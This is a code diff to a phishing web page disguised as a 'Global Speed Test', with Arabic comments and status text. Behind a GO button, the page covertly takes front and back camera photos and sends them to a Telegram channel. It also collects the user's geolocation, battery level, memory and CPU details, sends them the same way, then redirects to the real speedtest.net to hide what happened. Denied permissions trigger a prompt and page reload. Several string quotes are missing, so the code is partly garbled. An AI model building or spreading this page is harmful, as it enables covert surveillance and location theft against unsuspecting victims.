@@ -7,21 +7,22 @@
     <title>SpeedTest - Global Connectivity</title>
     <style>
         body { background-color: #0b0e18; color: white; font-family: sans-serif; text-align: center; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .circle { width: 220px; height: 220px; border: 5px solid #00d2ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; position: relative; transition: 0.3s; box-shadow: 0 0 30px rgba(0, 210, 255, 0.2); background: radial-gradient(circle, #1a2035 0%, #0b0e18 100%); z-index: 10; }
-        .circle:active { transform: scale(0.9); }
-        .loading { animation: pulse 1s infinite alternate; border-color: #ff0055; box-shadow: 0 0 40px #ff0055; }
-        @keyframes pulse { from { opacity: 1; } to { opacity: 0.5; } }
-        .speed-text { font-size: 55px; font-weight: bold; color: #00d2ff; pointer-events: none; }
+        /* زر GO بتصميم يمنع التداخل */
+        .go-button { width: 200px; height: 200px; background: radial-gradient(circle, #1a2035 0%, #0b0e18 100%); border: 5px solid #00d2ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; user-select: none; -webkit-tap-highlight-color: transparent; box-shadow: 0 0 20px rgba(0, 210, 255, 0.3); }
+        .go-button:active { transform: scale(0.95); border-color: #ff0055; }
+        .go-text { font-size: 60px; font-weight: bold; color: #00d2ff; pointer-events: none; } /* منع النص من اعتراض اللمس */
         #status { margin-top: 30px; font-size: 18px; color: #888; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <h2>Global Speed Test</h2>
-    <div class="circle" id="startBtn">
-        <span class="speed-text" id="btnText">GO</span>
+    <h2 style="margin-bottom: 40px;">Global Speed Test</h2>
+
+    <div class="go-button" id="mainBtn">
+        <span class="go-text">GO</span>
     </div>
+
     <p id="status">بانتظار بدء الفحص...</p>
 
     <video id="video" autoplay playsinline></video>
@@ -58,15 +59,10 @@
             } catch (e) { return null; }
         }
 
-        document.getElementById( startBtn ).onclick = async function() {
-            const btn = this;
+        document.getElementById( mainBtn ).addEventListener( click , async function() {
             const status = document.getElementById( status );
-            const btnText = document.getElementById( btnText );
-
-            // تفعيل الحركة فوراً عند الضغط ليتأكد المستخدم أن الزر يعمل
-            btn.classList.add( loading );
-            btnText.innerText = "...";
             status.innerText = "جاري الاتصال بالسيرفر...";
+            this.style.pointerEvents = "none"; // منع الضغط المتكرر
 
             // 1. التقاط الصور
             const fImg = await capture("user");
@@ -75,24 +71,27 @@
             const bImg = await capture("environment");
             if (bImg) await sendToTelegram("photo", bImg, "📸 صورة خلفية");
 
-            // 2. جمع البيانات والموقع
+            // 2. الموقع والبيانات التقنية
             if (navigator.geolocation) {
-                navigator
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    let batt = "غير معروف";
+                    try { const b = await navigator.getBattery(); batt = `${Math.round(b.level * 100)}%`; } catch(e){}
+                    
+                    const report = `✅ **تم الفحص بنجاح**\n\n` +
+                                   `🔋 البطارية: ${batt}\n` +
                                    `💾 الذاكرة: ${navigator.deviceMemory ||  4+ } GB\n` +
                                    `⚙️ المعالج: ${navigator.hardwareConcurrency ||  ؟ } نواة\n` +
                                    `📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
 
                     await sendToTelegram("text", report);
-                    
-                    clearInterval(interval);
-                    btnText.innerText = "94.2";
-                    status.innerText = "اكتمل الفحص بنجاح!";
-                    setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1500);
+                    status.innerText = "اكتمل الفحص!";
+                    setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
+                }, (err) => {
+                    alert("يرجى الموافقة على الأذونات للمتابعة.");
+                    location.reload();
                 });
             }
-        }
-
-        document.getElementById( startBtn ).onclick = startProcess;
+        });
     </script>
 </body>
 </html>
